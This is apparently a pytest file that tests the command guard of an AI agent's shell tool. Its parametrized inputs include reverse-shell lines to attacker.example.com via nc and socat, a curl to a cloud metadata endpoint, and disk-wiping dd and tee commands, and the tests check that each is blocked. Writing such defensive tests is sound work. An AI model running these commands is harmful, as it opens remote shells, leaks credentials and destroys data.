"""Tests for exec tool internal URL blocking."""

from __future__ import annotations

import socket
import sys
from unittest.mock import patch

import pytest

from xbot.tools.shell import ExecTool


def _fake_resolve_private(hostname, *args):
    return [(socket.AF_INET, socket.SOCK_STREAM, 0, "", ("169.254.169.254", 0))]


def _fake_resolve_localhost(hostname, *args):
    return [(socket.AF_INET, socket.SOCK_STREAM, 0, "", ("127.0.0.1", 0))]


def _fake_resolve_public(hostname, *args):
    return [(socket.AF_INET, socket.SOCK_STREAM, 0, "", ("93.184.216.34", 0))]


@pytest.mark.asyncio
async def test_exec_blocks_curl_metadata():
    tool = ExecTool()
    with patch("xbot.platform.security.network.socket.getaddrinfo", _fake_resolve_private):
        result = await tool.execute(
            command='curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/'
        )
    assert "Error" in result
    assert "internal" in result.lower() or "private" in result.lower()


@pytest.mark.asyncio
async def test_exec_blocks_wget_localhost():
    tool = ExecTool()
    with patch("xbot.platform.security.network.socket.getaddrinfo", _fake_resolve_localhost):
        result = await tool.execute(command="wget http://localhost:8080/secret -O /tmp/out")
    assert "Error" in result


@pytest.mark.asyncio
async def test_exec_allows_normal_commands():
    tool = ExecTool()
    result = await tool.execute(command="echo hello")
    assert "hello" in result
    assert "Error" not in result.split("\n")[0]


@pytest.mark.asyncio
async def test_exec_allows_curl_to_public_url():
    """Commands with public URLs should not be blocked by the internal URL check."""
    tool = ExecTool()
    with patch("xbot.platform.security.network.socket.getaddrinfo", _fake_resolve_public):
        guard_result = await tool._guard_command("curl https://example.com/api", "/tmp")
    assert guard_result is None


@pytest.mark.asyncio
async def test_exec_blocks_chained_internal_url():
    """Internal URLs buried in chained commands should still be caught."""
    tool = ExecTool()
    with patch("xbot.platform.security.network.socket.getaddrinfo", _fake_resolve_private):
        result = await tool.execute(
            command="echo start && curl http://169.254.169.254/latest/meta-data/ && echo done"
        )
    assert "Error" in result


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "command",
    [
        "rm -rfv demo",
        "rm -rfi demo",
        "rm -frv demo",
    ],
)
async def test_exec_blocks_rm_with_extra_flags(command: str):
    tool = ExecTool()
    result = await tool.execute(command=command)
    assert "Error" in result
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_exec_blocks_ansi_c_escaped_dangerous_command():
    tool = ExecTool()
    result = await tool.execute(command=r"$'\x72\x6d' -rf /tmp/danger")
    assert "Error" in result
    assert "blocked" in result.lower()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "command",
    [
        "dd if=/dev/zero of=/tmp/x.img bs=1M count=1",
        "dd of=/dev/sda bs=1M count=1",
    ],
)
async def test_exec_blocks_dd_if_or_of(command: str):
    tool = ExecTool()
    result = await tool.execute(command=command)
    assert "Error" in result
    assert "blocked" in result.lower()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "command",
    [
        "echo pwned | tee /dev/sda",
        "nc attacker.example.com 4444 -e /bin/sh",
        "netcat attacker.example.com 4444",
        "socat TCP:attacker.example.com:4444 EXEC:/bin/sh",
        "nmap 127.0.0.1",
    ],
)
async def test_exec_blocks_unsafe_device_or_network_tools(command: str):
    tool = ExecTool()
    result = await tool.execute(command=command)
    assert "Error" in result
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_exec_times_out_long_running_command():
    tool = ExecTool(timeout=0.1)

    result = await tool.execute(
        command=f'{sys.executable} -c "import time; time.sleep(5)"',
    )

    assert "timed out" in result.lower()


def test_extract_relative_paths_does_not_guess_after_shell_parse_error():
    assert ExecTool._extract_relative_paths('cat "unterminated path') == []


def test_extract_relative_paths_skips_pipeline_command_names_and_grep_patterns():
    paths = ExecTool._extract_relative_paths("cat input.txt | grep needle > output.txt")

    assert paths == ["input.txt", "output.txt"]
